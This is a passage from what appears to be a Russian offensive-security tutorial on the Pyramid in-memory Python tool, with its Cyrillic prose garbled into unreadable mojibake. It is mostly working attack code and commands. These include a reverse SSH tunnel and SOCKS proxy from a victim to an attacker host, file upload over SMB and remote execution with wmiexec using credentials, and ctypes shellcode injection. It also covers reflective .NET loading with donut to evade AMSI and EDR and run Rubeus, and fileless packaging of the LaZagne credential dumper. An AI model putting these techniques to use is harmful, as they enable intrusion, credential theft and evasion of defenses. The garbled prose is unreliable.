–ö–∞–∫ —É–∂–µ –Ω–µ —Ä–∞–∑ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å, –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ SOCKS-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –º–∞—à–∏–Ω–æ–π-–∂–µ—Ä—Ç–≤–æ–π ‚Äî –Ω–µ–æ—Ç—ä–µ–º–ª–µ–º–∞—è —á–∞—Å—Ç—å –∂–∏–∑–Ω–∏ –ª—é–±–æ–≥–æ —ç—Ç–∏—á–Ω–æ–≥–æ —Ö–∞–∫–µ—Ä–∞. –ò –≤ —ç—Ç–æ–º –Ω–∞–º —Ç–æ–∂–µ –º–æ–∂–µ—Ç –ø–æ–º–æ—á—å Pyramid.

–í –º–æ–¥—É–ª–µ [Paramiko](https://github.com/paramiko/paramiko) –µ—Å—Ç—å –≥–æ—Ç–æ–≤—ã–π SSH-–∫–ª–∏–µ–Ω—Ç, –±–ª–∞–≥–æ–¥–∞—Ä—è –∫–æ—Ç–æ—Ä–æ–º—É –º—ã –º–æ–∂–µ–º —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±—Ä–∞—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –º–∞—à–∏–Ω–æ–π –∞—Ç–∞–∫—É—é—â–µ–≥–æ –ø–æ SSH, –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–±—Ä–∞—Ç–Ω—ã–π –ø—Ä–æ–±—Ä–æ—Å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ—Ä—Ç–∞ —Å –∂–µ—Ä—Ç–≤—ã –Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏ —Ä–∞–∑–≤–µ—Ä–Ω—É—Ç—å –Ω–∞ –∂–µ—Ä—Ç–≤–µ —Å–µ—Ä–≤–µ—Ä SOCKS5, —Å–ª—É—à–∞—é—â–∏–π –Ω–∞ –ø—Ä–æ–±—Ä–æ—à–µ–Ω–Ω–æ–º –ø–æ—Ä—Ç—É.

–°–Ω–∞—á–∞–ª–∞ –ø–æ—Å–º–æ—Ç—Ä–∏–º, –∫–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö. –° –∂–µ—Ä—Ç–≤—ã —è –ø–æ–¥–∫–ª—é—á—É—Å—å –∫ —Å–≤–æ–µ–π –º–∞—à–∏–Ω–µ —Å Kali –ø–æ SSH –∏ –ø–æ–¥–Ω–∏–º—É –Ω–∞ –ø—Ä–æ–±—Ä–æ—à–µ–Ω–Ω–æ–º –ø–æ—Ä—Ç—É SOCKS-—Å–µ—Ä–≤–µ—Ä —Å –ø–æ–º–æ—â—å—é [pproxy](https://github.com/moreati/pproxy).

```powershell
PS > ssh -R 444:127.0.0.1:443 snovvcrash@192.168.1.80
PS > pip install pproxy
PS > pproxy -l "http+socks4+socks5://127.0.0.1:443"
```

[![socks-over-ssh-demo.png](/assets/images/python-pyramid/socks-over-ssh-demo.png)](/assets/images/python-pyramid/socks-over-ssh-demo.png)
{:.center-image}

Reverse SSH + SOCKS5 = ‚ù§Ô∏è
{:.quote}

–¢–µ–ø–µ—Ä—å —è –º–æ–≥—É –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å ProxyChains –Ω–∞ –ø–æ—Ä—Ç 444 –∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π —Å–µ—Ç—å—é –∏–º–ø—Ä–æ–≤–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ ¬´–∑–∞–∫–∞–∑—á–∏–∫–∞¬ª.

[![proxychains-cme.png](/assets/images/python-pyramid/proxychains-cme.png)](/assets/images/python-pyramid/proxychains-cme.png)
{:.center-image}

ProxyChains CME
{:.quote}

–°–æ–±–µ—Ä–µ–º —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –º—ã –∑–∞–ø—É—Å—Ç–∏–º –∏–∑ –ø–∞–º—è—Ç–∏. –î–ª—è —ç—Ç–æ–≥–æ –∞–≤—Ç–æ—Ä [—Å–∫–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–ª](https://github.com/naksyn/Pyramid/blob/7f1a839e9667d1c5a5c32fddfad3d353d8410682/Server/base-tunnel-socks5.py#L236-L1509) —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é [rforward.py](https://github.com/paramiko/paramiko/blob/main/demos/rforward.py) –∏–∑ Paramiko –∏ –º–æ–¥—É–ª—å pproxy, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–π –≤—ã—à–µ. –í —ç—Ç–æ—Ç —Ä–∞–∑ —Å–Ω–æ–≤–∞ –Ω–µ –æ–±–æ–π–¥–µ—Ç—Å—è –±–µ–∑ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Ä–∞—Å–ø–∞–∫–æ–≤–∞—Ç—å –Ω–∞ –¥–∏—Å–∫ ‚Äî —ç—Ç–æ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—è –≤ `.pyd`-—Ñ–∞–π–ª–∞—Ö –¥–ª—è SSH.

```bash
#!/usr/bin/env bash

cat << EOT > pwn.py
PYRAMID_HOST = '10.10.13.37'
PYRAMID_PORT = '443'
PYRAMID_USERNAME = 'attacker'
PYRAMID_PASSWORD = 'Passw0rd1!'
PYRAMID_TO_UNPACK = ('paramiko_pyds_dependencies',)
PYRAMID_TO_IMPORT = (
    'six',
    'cffi',
    'paramiko',
    'proto',)

SSH_USERNAME = 'attacker'
SSH_PASSWORD = 'Passw0rd2!'
SSH_CONNECTION = ('10.10.13.37', int('22'))  # Attacker
SSH_REMOTE_FORWARD = '444'  # Listening on Attacker
SSH_LOCAL_FORWARD = '443'  # Forwarded to Victim
SSH_FORWARD_CONNECTION = ('127.0.0.1', int(SSH_LOCAL_FORWARD))

SOCKS_CONNECTION = f'http+socks4+socks5://127.0.0.1:{SSH_LOCAL_FORWARD}'
EOT

cat {cfinder,socks5}.py >> pwn.py
```

–í —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ –ø–æ–∫–∞–∂–µ–º, —á—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞ Pyramid –ø—Ä–∏–º–µ–Ω–∏–º–∞ –∏ –≤ —Å–ª—É—á–∞–µ, –∫–æ–≥–¥–∞ —É –∞—Ç–∞–∫—É—é—â–µ–≥–æ –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –≥—Ä–∞—Ñ–∏—á–µ—Å–∫–æ–π –æ–±–æ–ª–æ—á–∫–∏ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã. –î–ª—è —ç—Ç–æ–≥–æ —è —Å–ø–µ—Ä–≤–∞ –∏—Å–ø–æ–ª—å–∑—É—é [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), —á—Ç–æ–±—ã —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ø–µ—Ä–µ–Ω–µ—Å—Ç–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å Python-–∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–æ–º.

```terminal?prompt=$
~$ curl -sSL https://www.python.org/ftp/python/3.10.8/python-3.10.8-embed-amd64.zip > python-3.10.8-embed-amd64.zip
~$ mkdir python-3.10.8-embed-amd64
~$ cd python-3.10.8-embed-amd64
~$ unzip -q ../python-3.10.8-embed-amd64.zip
~$ vi cradle.py
~$ smbclient '//VICTIM/C$' -U j.doe%'Passw0rd3!' -c '
prompt OFF;
recurse ON;
cd \Users\j.doe\Downloads;
mkdir python-3.10.8-embed-amd64;
cd python-3.10.8-embed-amd64;
mput \*'
```

[![socks-over-ssh-transfer.png](/assets/images/python-pyramid/socks-over-ssh-transfer.png)](/assets/images/python-pyramid/socks-over-ssh-transfer.png)
{:.center-image}

–ü–µ—Ä–µ–±—Ä–æ—Å Python-–∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞
{:.quote}

–¢–µ–ø–µ—Ä—å –≤—Å–µ, —á—Ç–æ –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, ‚Äî —ç—Ç–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—É—é –∫–æ–º–∞–Ω–¥—É –Ω–∞ –∂–µ—Ä—Ç–≤–µ, –∑–∞–ø—É—Å–∫–∞—é—â—É—é headless-–ü–∏—Ç–æ–Ω `pythonw.exe` —Å —É–∫–∞–∑–∞–Ω–∏–µ–º –ø—É—Ç–∏ –¥–æ –ø–µ—Ä–≤–∏—á–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞-–∑–∞–≥—Ä—É–∑—á–∏–∫–∞. –î–∞–ª–µ–µ –º–æ–∂–Ω–æ –æ—Ç–∫–∏–Ω—É—Ç—å—Å—è –Ω–∞ —Å–ø–∏–Ω–∫—É –∫—Ä–µ—Å–ª–∞ –∏ –Ω–∞—Å–ª–∞–∂–¥–∞—Ç—å—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–º.

```terminal?prompt=$
~$ wmiexec.py j.doe:'Passw0rd3!'@VICTIM '\Users\j.doe\Downloads\python-3.10.8-embed-amd64\pythonw.exe \Users\j.doe\Downloads\python-3.10.8-embed-amd64\cradle.py' -nooutput -silentcommand
```

[![socks-over-ssh-run.png](/assets/images/python-pyramid/socks-over-ssh-run.png)](/assets/images/python-pyramid/socks-over-ssh-run.png)
{:.center-image}

–¢—É–Ω–Ω–µ–ª–∏, —Ç—É–Ω–Ω–µ–ª–∏, —Ç—É–Ω–Ω–µ–ª–∏!
{:.quote}

–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø—Ä–∏ –∞–∫—Ç–∏–≤–Ω–æ–º —Å—Ä–µ–¥—Å—Ç–≤–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–π –∑–∞—â–∏—Ç—ã –º—ã –ø–æ–ª—É—á–∏–ª–∏ –æ–±—Ä–∞—Ç–Ω–æ–µ SSH-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏e, –ø–æ–≤–µ—Ä—Ö –∫–æ—Ç–æ—Ä–æ–≥–æ –∑–∞–ø—É—Å—Ç–∏–ª–∏ SOCKS-—Å–µ—Ä–≤–µ—Ä –∏ —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å —Ä–µ—Å—É—Ä—Å–∞–º–∏ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–π —Å–µ—Ç–∏ ¬´–∑–∞–∫–∞–∑—á–∏–∫–∞¬ª. –ò –Ω–∞–ø–æ–º–∏–Ω–∞—é, —á—Ç–æ –≤—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ –ø—Ä–æ–∏–∑–æ—à–ª–æ –≤ –ø–∞–º—è—Ç–∏, –±–µ–∑ —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –Ω–∞ –¥–∏—Å–∫–µ!

## Python.NET

–ê–≤—Ç–æ—Ä –∏–Ω—Å—Ç—Ä–º–µ–Ω—Ç–∞ [–ø—Ä–µ–¥–ª–æ–∂–∏–ª](https://github.com/naksyn/Pyramid/blob/main/Server/base-bof.py) –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π —Å–ø–æ—Å–æ–± –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –¥—Ä—É–≥–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–º –≤–Ω—É—Ç—Ä–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ Python, –∞ –∏–º–µ–Ω–Ω–æ ‚Äî –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è —à–µ–ª–ª-–∫–æ–¥–∞ –∏–∑ [BOF](https://ppn.snovvcrash.rocks/red-team/maldev/bof-coff)-—Ñ–∞–π–ª–æ–≤ (Beacon Object Files) —Å –ø–æ–º–æ—â—å—é [BOF2shellcode](https://github.com/FalconForceTeam/BOF2shellcode) –∏ –ø–æ—Å–ª–µ–¥—É—é—â–∏–π –∏–Ω–∂–µ–∫—Ç –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –ø–∏—Ç–æ–Ω–∞ –Ω–µ—Ö–∏—Ç—Ä—ã–º API-—Ç—Ä–∏–æ `HeapCreate`, `RtlMoveMemory`, `CreateThread`:

```python
HeapCreate = ctypes.windll.kernel32.HeapCreate
HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
HeapCreate.restype = wt.HANDLE

RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
RtlMoveMemory.restype = wt.LPVOID

CreateThread = ctypes.windll.kernel32.CreateThread
CreateThread.argtypes = [
    wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
    wt.LPVOID, wt.DWORD, wt.LPVOID
]
CreateThread.restype = wt.HANDLE

WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
WaitForSingleObject.restype = wt.DWORD

heap = HeapCreate(0x00040000, len(sc), 0)
HeapAlloc(heap, 0x00000008, len(sc))
print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))
RtlMoveMemory(heap, sc, len(sc))
print('[*] Shellcode copied into memory.')
thread = CreateThread(0, 0, heap, 0, 0, 0)
print('[*] CreateThread() in same process.')
WaitForSingleObject(thread, 0xFFFFFFFF)
```

–Ø —Ä–µ—à–∏–ª –ø–æ–π—Ç–∏ –ø–æ –¥—Ä—É–≥–æ–º—É –ø—É—Ç–∏ –∏ –ø—Ä–∏–Ω–µ—Å—Ç–∏ —Å —Å–æ–±–æ–π –Ω–∞ –∂–µ—Ä—Ç–≤—É [CLR](https://www.nuget.org/packages/pythonnet) .NET-–∫–æ–¥–∞, –≤—ã–∑—ã–≤–∞–µ–º—ã–π –∏–∑ Python ‚Äì —Ç–æ –µ—Å—Ç—å –æ—Ñ–æ—Ä–º–∏—Ç—å –º–æ–¥—É–ª—å [Python.NET](https://github.com/pythonnet/pythonnet) –¥–ª—è –µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å Pyramid. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –º—ã –º–æ–∂–µ–º –∑–∞–≥—Ä—É–∂–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã .NET –ø–æ –ø—Ä–∏–Ω—Ü–∏–ø—É [Reflective Assembly](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly) –∏–∑ –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ Python. –≠—Ç–æ –Ω–µ –∏–∑–±–∞–≤–ª—è–µ—Ç –Ω–∞—Å –æ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —É–∫–ª–æ–Ω—è—Ç—å—Å—è –æ—Ç AMSI –ø—Ä–∏ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–∏, –æ–¥–Ω–∞–∫–æ –¥–ª—è —ç—Ç–æ–≥–æ –µ—Å—Ç—å –¥—Ä—É–≥–æ–π —Ç—Ä—é–∫ ‚Äî —ç—Ç–æ [donut](https://github.com/TheWover/donut)!

–ò–¥–µ—è –≤ —Ç–æ–º, —á—Ç–æ–±—ã –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞–≤–µ–¥–æ–º–æ ¬´–ø–∞–ª—é—â—É—é—Å—è¬ª —Å–±–æ—Ä–∫—É .NET –≤ –ø–æ–∑–∏—Ü–∏–æ–Ω–Ω–æ-–Ω–µ–∑–∞–≤–∏—Å–∏–º—ã–π —à–µ–ª–ª-–∫–æ–¥ –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ –≤–º–µ—Å—Ç–µ —Å —Ç—Ä–∏–≤–∏–∞–ª—å–Ω—ã–º –∏–Ω–∂–µ–∫—Ç–æ—Ä–æ–º –Ω–∞ C#. –ö–∞–∫ —Å–¥–µ–ª–∞—Ç—å –Ω–µ–¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ–º—ã–π –∏–Ω–∂–µ–∫—Ç–æ—Ä, –º—ã –ø–æ–¥—Ä–æ–±–Ω–æ –æ–±—Å—É–∂–¥–∞–ª–∏, –∫–æ–≥–¥–∞ [–º—É—á–∏–ª–∏ KeePass](https://xakep.ru/2022/03/31/keethief/), –∞ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–º–æ —è –≤–æ—Å–ø–æ–ª—å–∑—É—é—Å—å —Å–≤–æ–∏–º –∑–∞–∫—Ä—ã—Ç—ã–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Ç–∞–∫–æ–≥–æ –∏–Ω–∂–µ–∫—Ç–æ—Ä–∞.

[![donut-self-injector.png](/assets/images/python-pyramid/donut-self-injector.png)](/assets/images/python-pyramid/donut-self-injector.png)
{:.center-image}

–õ—é–±–ª—é –ø–æ–Ω—á–∏–∫–∏ üç©üç©üç©
{:.quote}

–ü–æ—Å–ª–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∏–Ω–∂–µ–∫—Ç–æ—Ä–∞ —è –µ–≥–æ —Å–æ–∂–º—É –∏ –∑–∞–≤–µ—Ä–Ω—É –≤ Base64:

```python
>>> import zlib
>>> from base64 import b64encode
>>>
>>> with open('Program.exe', 'rb') as f:
>>>     b64encode(zlib.compress(f.read(), level=9)).decode()  # <ASSEMBLY_BYTES_BASE64>
```

–ò —Ç–µ–ø–µ—Ä—å —Å –ø–æ–º–æ—â—å—é —Ç–∞–∫–æ–≥–æ –ø—Ä–æ—Å—Ç–æ–≥–æ —Ç–µ–º–ø–ª–µ–π—Ç–∞ –º–æ–∂–Ω–æ –≤—ã–∑—ã–≤–∞—Ç—å –∏–∑ –ø–∞–º—è—Ç–∏ Python –Ω–∞—Å—Ç—É–ø–∞—Ç–µ–ª—å–Ω—ã–µ —Å–±–æ—Ä–∫–∏ .NET:

```python
import clr
import zlib
import base64

clr.AddReference('System')
from System import *
from System.Reflection import *

b64 = base64.b64encode(zlib.decompress(base64.b64decode(b'<ASSEMBLY_BYTES_BASE64>'))).decode()
raw = Convert.FromBase64String(b64)

assembly = Assembly.Load(raw)
type = assembly.GetType('Namespace.Type')
type.GetMethod('Method').Invoke(Activator.CreateInstance(type), None)
```

–í–æ—Ç —Ç—É—Ç –≤–æ—Ç –≤—Å—è–∫–∏–µ –±–ª—É—Ç–∏–º–µ—Ä—ã –∫–æ–≤—ã—Ä—è—é—Ç –º–∞–ª–≤–∞—Ä–Ω—ã–π –ª–æ–∞–¥–µ—Ä –Ω–∞ IronPython, –¥–µ–ª–∞—é—â–∏–π –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–æ –∂–µ —Å–∞–º–æ–µ:

- [Snakes on a Domain: An Analysis of a Python Malware Loader](https://www.huntress.com/blog/snakes-on-a-domain-an-analysis-of-a-python-malware-loader)

E—â–µ –æ–¥–∏–Ω —Å–∫—Ä–∏–ø—Ç –Ω–∞ –∫–æ–ª–µ–Ω–∫–µ —Å —É–∫–∞–∑–∞–Ω–∏–µ–º –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π, —á—Ç–æ–±—ã —Å–æ–±—Ä–∞—Ç—å —Ç–µ–º–ø–ª–µ–π—Ç—ã –≤–æ–µ–¥–∏–Ω–æ, –∏ –º–æ–∂–Ω–æ –∑–∞–ø—É—Å–∫–∞—Ç—å Rubeus –Ω–∞ –º–∞—à–∏–Ω–µ —Å EDR.

```sh
#!/usr/bin/env bash

cat << EOT > pwn.py
PYRAMID_HOST = '10.10.13.37'
PYRAMID_PORT = '443'
PYRAMID_USERNAME = 'attacker'
PYRAMID_PASSWORD = 'Passw0rd1!'
PYRAMID_TO_UNPACK = ('pythonnet',)
PYRAMID_TO_IMPORT = (
    'cffi',
    'pycparser',)
EOT

cat {cfinder,clr}.py >> pwn.py
```

[![donut-rubeus.png](/assets/images/python-pyramid/donut-rubeus.png)](/assets/images/python-pyramid/donut-rubeus.png)
{:.center-image}

–•–∞–≥—Ä–∏–¥ –±—ã –≥–æ—Ä–¥–∏–ª—Å—è –Ω–∞–º–∏ üò¢
{:.quote}

## LaZagne

–ü–æ–º–Ω—è [–æ –º–µ—á—Ç–µ](https://twitter.com/shitsecure/status/1428063492255453189) –º–Ω–æ–≥–∏—Ö –º–æ–∏—Ö –∫–æ–ª–ª–µ–≥ –ø–æ —Ü–µ—Ö—É, –∞ –∏–º–µ–Ω–Ω–æ –æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –∑–∞–ø—É—Å–∫–∞ —Å–±–æ—Ä—â–∏–∫–∞ –ª—É—Ç–∞ [LaZagne](https://github.com/AlessandroZ/LaZagne) –∏–∑ –ø–∞–º—è—Ç–∏, –≤–æ–ø–ª–æ—â–µ–Ω–∏–µ —ç—Ç–æ–π –∏–¥–µ–∏ ‚Äî –ø–µ—Ä–≤–æ–µ, —á–µ–º —è –∑–∞–Ω—è–ª—Å—è, –∫–æ–≥–¥–∞ –Ω–∞—á–∞–ª –∏–≥—Ä–∞—Ç—å —Å Pyramid. –ù–∞ —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ –ø–æ–∫–∞–∂–µ–º, –∫–∞–∫ –º–æ–∂–Ω–æ –ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ª—é–±–æ–π –ø–∏—Ç–æ–Ω–æ–≤—Å–∫–∏–π –º–æ–¥—É–ª—å –¥–ª—è –±–µ–∑—Ñ–∞–π–ª–æ–≤–æ–≥–æ –∏–º–ø–æ—Ä—Ç–∞ —Å –ø–æ–º–æ—â—å—é CFinder.

–î–ª—è –Ω–∞—á–∞–ª–∞ —Å–æ—Å—Ç–∞–≤–∏–º —Å–ø–∏—Å–æ–∫ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞–º –ø–æ–Ω–∞–¥–æ–±—è—Ç—Å—è –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞ LaZagne. –Ø –¥–µ–ª–∞–ª —ç—Ç–æ –º–µ—Ç–æ–¥–æ–º –ø—Ä–æ–± –∏ –æ—à–∏–±–æ–∫, –ø–æ—Ç–æ–º—É —á—Ç–æ —è –ª–µ–Ω–∏–≤—ã–π, –Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–µ–µ –±—ã–ª–æ –±—ã –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ [requirements.txt](https://github.com/AlessandroZ/LaZagne/blob/master/requirements.txt) ¬´–õ–∞–∑–∞–Ω—å–∏¬ª, –ø–æ—Ç–æ–º –Ω–∞ [install_requires](https://github.com/skelsec/pypykatz/blob/master/setup.py#L53-L63) Pypykatz –∏ –≤—ã—á–ª–µ–Ω–∏—Ç—å –∏–∑ —ç—Ç–æ–≥–æ —Å–ø–∏—Å–∫–∞ —Ç–æ–ª—å–∫–æ —Ç–æ, –∫–æ—Ç–æ—Ä—ã–µ —Ä–µ–∞–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ LaZagne. –£ –º–µ–Ω—è –ø–æ–ª—É—á–∏–ª—Å—è —Ç–∞–∫–æ–π —Å–ø–∏—Å–æ–∫:

```bash
#!/usr/bin/env bash

cat << EOT > pwn.py
PYRAMID_HOST = '10.10.13.37'
PYRAMID_PORT = '443'
PYRAMID_USERNAME = 'attacker'
PYRAMID_PASSWORD = 'Passw0rd1!'
PYRAMID_TO_UNPACK = ('Cryptodome',)
PYRAMID_TO_IMPORT = (
	'future',
	'pyasn1',
	'rsa',
	'asn1crypto',
	'unicrypto',
	'minidump',
	'minikerberos',
	'pypykatz',
	'lazagne',)

LAZAGNE_MODULE = 'all'
LAZAGNE_VERBOSITY = '-vv'  # '' / '-v' / '-vv'
EOT

cat {cfinder,lazagne}.py >> pwn.py
```

–í—ã–≥—Ä—É–∑–∏–º –≤—Å–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –≤ –∏—Å—Ö–æ–¥–Ω–∏–∫–∞—Ö –ª–æ–∫–∞–ª—å–Ω–æ –∫ —Å–µ–±–µ –Ω–∞ –º–∞—à–∏–Ω—É:

```terminal?prompt=$
~$ wget https://files.pythonhosted.org/packages/45/0b/38b06fd9b92dc2b68d58b75f900e97884c45bedd2ff83203d933cf5851c9/future-0.18.2.tar.gz
~$ tar -xf future-0.18.2.tar.gz && rm future-0.18.2.tar.gz
~$ git clone https://github.com/etingof/pyasn1
~$ wget https://files.pythonhosted.org/packages/aa/65/7d973b89c4d2351d7fb232c2e452547ddfa243e93131e7cfa766da627b52/rsa-4.9.tar.gz
~$ tar -xf rsa-4.9.tar.gz && rm rsa-4.9.tar.gz
~$ git clone https://github.com/wbond/asn1crypto
~$ git clone https://github.com/skelsec/unicrypto
~$ git clone https://github.com/skelsec/minidump
~$ git clone https://github.com/skelsec/minikerberos
~$ git clone https://github.com/skelsec/pypykatz
~$ git clone https://github.com/AlessandroZ/LaZagne
```

–¢–µ–ø–µ—Ä—å –≤ –∫–∞–∂–¥–æ–º –∏–∑ —Ñ–∞–π–ª–æ–≤ .py –Ω–∞–º –Ω—É–∂–Ω–æ –∑–∞–º–µ–Ω–∏—Ç—å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ –∏–º–ø–æ—Ä—Ç—ã –Ω–∞ –∞–±—Å–æ–ª—é—Ç–Ω—ã–µ —Å —É–∫–∞–∑–∞–Ω–∏–µ–º –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏ –¥–æ –º–æ–¥—É–ª—è (–ø–æ—Ç–æ–º—É —á—Ç–æ –≤ –∑–∏–ø–∞—Ö, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –¥–µ—Ä–∂–∏–º –≤ –ø–∏—Ç–æ–Ω–æ–≤—Å–∫–æ–π –ø–∞–º—è—Ç–∏, –Ω–µ—Ç –ø–æ–Ω—è—Ç–∏—è –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—É—Ç–µ–π), —Ç–æ –µ—Å—Ç—å, —á—Ç–æ–±—ã –≤ –∫–æ–Ω–µ—á–Ω—ã—Ö —É–ø–∞–∫–æ–≤–∞–Ω–Ω—ã—Ö –º–æ–¥—É–ª—è—Ö –Ω–µ –±—ã–ª–æ —Ç–∞–∫–æ–≥–æ.

[![python-relative-imports.png](/assets/images/python-pyramid/python-relative-imports.png)](/assets/images/python-pyramid/python-relative-imports.png)
{:.center-image}

Relative imports are NOT welcome!
{:.quote}

–û–ø—è—Ç—å –∂–µ, –Ω–µ —Å–∏–ª—å–Ω–æ –∑–∞–º–æ—Ä–∞—á–∏–≤–∞—è—Å—å, —è –Ω–∞–±—Ä–æ—Å–∞–ª –ø—Ä–æ—Å—Ç–µ–Ω—å–∫–∏–π —Å–∫—Ä–∏–ø—Ç (–≥–ª–∞–≤–Ω–æ–µ ‚Äî —á—Ç–æ–±—ã —Ä–∞–±–æ—Ç–∞–ª!), –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–æ—Ö–æ–¥–∏—Ç –ø–æ –≤—Å–µ–º –∏—Å—Ö–æ–¥–Ω–∏–∫–∞–º –∏ —Ä–µ–≥—É–ª—è—Ä–∫–∞–º–∏ –ø—Ä–∏–≤–æ–¥–∏—Ç ¬´—Å–ª–æ–º–∞–Ω–Ω—ã–µ¬ª –∏–º–ø–æ—Ä—Ç—ã –≤ –Ω—É–∂–Ω—ã–π –Ω–∞–º –≤–∏–¥:

```python
#!/usr/bin/env python3

import os
import re
import sys
from glob import glob
from pathlib import Path
from zipfile import ZipFile

from binaryornot.check import is_binary

base_cwd = os.getcwd()
os.chdir(sys.argv[1])
cwd = Path.cwd().stem

